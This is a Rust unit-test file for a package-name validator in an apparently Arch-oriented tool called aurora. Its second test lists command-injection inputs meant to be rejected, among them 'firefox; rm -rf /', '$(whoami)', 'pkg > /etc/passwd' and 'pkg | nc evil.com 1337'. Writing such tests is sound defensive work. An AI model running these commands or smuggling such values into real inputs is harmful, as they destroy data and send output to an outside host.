#[cfg(test)]
mod tests {
    use aurora::security::is_valid_package_name;

    #[test]
    fn test_valid_arch_package_names() {
        assert!(is_valid_package_name("firefox"));
        assert!(is_valid_package_name("visual-studio-code-bin"));
        assert!(is_valid_package_name("python-numpy"));
        assert!(is_valid_package_name("gcc-libs_1.2"));
        assert!(is_valid_package_name("lib32-glibc"));
        assert!(is_valid_package_name("neovim"));
        assert!(is_valid_package_name("ttf-fira-code"));
    }

    #[test]
    fn test_injection_attempts_blocked() {
        let malicious_inputs = [
            "firefox; rm -rf /",
            "vlc && sudo reboot",
            "$(whoami)",
            "`id`",
            "foo bar",
            "pkg > /etc/passwd",
            "pkg | nc evil.com 1337",
            "pkg\nrm -rf ~",
            "-rf",
            "",
            "   ",
        ];

        for input in malicious_inputs {
            assert!(
                !is_valid_package_name(input),
                "Tehlikeli girdi engellenmelidir: '{}'",
                input
            );
        }
    }
}
